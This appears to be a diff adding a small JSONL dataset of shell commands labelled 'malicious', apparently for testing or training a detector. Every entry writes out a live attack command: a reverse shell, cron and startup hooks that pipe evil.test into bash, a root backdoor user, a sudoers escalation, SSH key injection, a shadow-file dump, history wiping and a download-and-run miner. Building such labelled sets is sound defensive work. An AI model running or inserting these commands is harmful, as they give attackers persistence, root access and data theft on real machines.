@@ -1,0 +1,15 @@
+{"id": "b01", "label": "malicious", "desc": "reverse shell in bashrc", "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc"}
+{"id": "b02", "label": "malicious", "desc": "cron persistence", "command": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -"}
+{"id": "b03", "label": "malicious", "desc": "backdoor user", "command": "useradd -o -u 0 -g 0 backdoor -s /bin/bash -p '$1$hack$xyz'"}
+{"id": "b04", "label": "malicious", "desc": "sudoers escalation", "command": "echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"}
+{"id": "b05", "label": "malicious", "desc": "dns hijack", "command": "echo 'nameserver 6.6.6.6' > /etc/resolv.conf"}
+{"id": "b06", "label": "malicious", "desc": "suid backdoor", "command": "cp /bin/bash /tmp/.hidden_shell && chmod u+s /tmp/.hidden_shell"}
+{"id": "b07", "label": "malicious", "desc": "exfil shadow", "command": "cat /etc/shadow | base64 > /tmp/exfil.txt"}
+{"id": "b08", "label": "malicious", "desc": "ssh key injection", "command": "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3...attacker-key' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"}
+{"id": "b09", "label": "malicious", "desc": "systemd persistence", "command": "mkdir -p /etc/systemd/system && cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/bin/bash -c 'while true; do sleep 60; done'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF"}
+{"id": "b10", "label": "malicious", "desc": "ld preload hijack", "command": "echo '/tmp/evil.so' > /etc/ld.so.preload"}
+{"id": "b11", "label": "malicious", "desc": "rc.local persistence", "command": "echo '#!/bin/bash\ncurl http://evil.test/payload | bash' > /etc/rc.local && chmod +x /etc/rc.local"}
+{"id": "b12", "label": "malicious", "desc": "passwd modify root", "command": "sed -i 's/root:x:/root::/g' /etc/passwd"}
+{"id": "b13", "label": "malicious", "desc": "anti forensics", "command": "ln -sf /dev/null ~/.bash_history && export HISTFILE=/dev/null && export HISTSIZE=0"}
+{"id": "b14", "label": "malicious", "desc": "download and exec", "command": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"}
+{"id": "b15", "label": "malicious", "desc": "profile backdoor", "command": "echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile"}
